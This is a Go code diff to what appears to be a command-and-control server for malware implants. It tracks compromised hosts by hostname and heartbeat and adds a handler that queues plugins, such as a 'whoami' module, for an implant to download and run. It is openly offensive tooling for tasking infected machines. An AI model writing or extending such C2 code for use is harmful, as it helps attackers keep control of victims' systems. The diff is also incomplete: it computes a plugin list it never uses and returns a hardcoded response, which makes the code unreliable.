@@ -20,10 +20,10 @@ type Implant struct {
 	HostName           string
 	LastKnownIp        string
 	LastKnownHeartBeat time.Time
-	PluginsToLoad      []PluginsFromC2
+	PluginsToLoad      []PluginFromC2
 }
 
-type PluginsFromC2 []struct {
+type PluginFromC2 struct {
 	PluginID   string `json:"pluginId"`
 	PluginURL  string `json:"pluginUrl"`
 	PluginName string `json:"pluginName"`
@@ -61,16 +61,15 @@ func postHeartbeat(w http.ResponseWriter, r *http.Request) {
 	fmt.Println("Got client with code: " + code)
 	if entry, ok := implants[hostname]; ok {
 		entry.LastKnownHeartBeat = time.Now()
-		entry.PluginsToLoad = nil
-		entry.PluginsToLoad = make([]PluginsFromC2, 0)
 		implants[hostname] = entry
 	} else {
 		implants[hostname] = Implant{
 			HostName:           hostname,
 			LastKnownHeartBeat: time.Now(),
-			PluginsToLoad:      make([]PluginsFromC2, 0),
+			PluginsToLoad:      make([]PluginFromC2, 0),
 		}
 	}
+	pluginsToReturn := implants[hostname].PluginsToLoad
 	fmt.Println(implants)
 	io.WriteString(w, "[{\"pluginId\":\""+RandomString(16)+"\",\"pluginUrl\":\"http://localhost:3333/plugin/\",\"pluginName\":\"whoami\"}]")
 }
@@ -121,6 +120,21 @@ func postAddToKnownPlugins(w http.ResponseWriter, r *http.Request) {
 	}
 	fmt.Println("KNOWN PLUGINS", knownPlugins)
 	io.WriteString(w, "OK")
+}
+
+func postAddPluginToImplant(w http.ResponseWriter, r *http.Request) {
+	r.ParseForm()
+	pluginName := r.Form.Get("pluginname")
+	implantName := r.Form.Get("implantname")
+	pluginToImplant := PluginFromC2{
+		PluginID:   RandomString(16),
+		PluginURL:  "http://localhost:3333/plugin/", //For now this is the only that is needed. Maybe change in the future
+		PluginName: pluginName,
+	}
+	entry := implants[implantName]
+	entry.PluginsToLoad = append(implants[implantName].PluginsToLoad, pluginToImplant)
+	implants[implantName] = entry
+	io.WriteString(w, "Added "+pluginName+" to "+implantName)
 }
 
 func main() {
